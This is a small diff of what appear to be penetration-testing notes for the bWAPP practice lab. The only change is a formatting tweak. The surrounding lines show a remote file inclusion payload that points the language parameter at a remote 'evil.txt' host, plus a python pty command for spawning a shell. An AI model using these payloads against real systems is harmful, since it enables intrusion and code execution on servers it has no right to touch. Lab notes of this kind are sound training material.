@@ -13,7 +13,7 @@ run
 ***Remote & Local File Inclusion (RFI/LFI)***
 
 http://192.168.1.135/bWAPP/rlfi.php?language=lang_en.php&action=go  
-**Change to:**
+**Change to:**  
 ?language=http://192.168.112.4/evil.txt
 
 python -c 'import pty; pty.spawn("/bin/sh")'
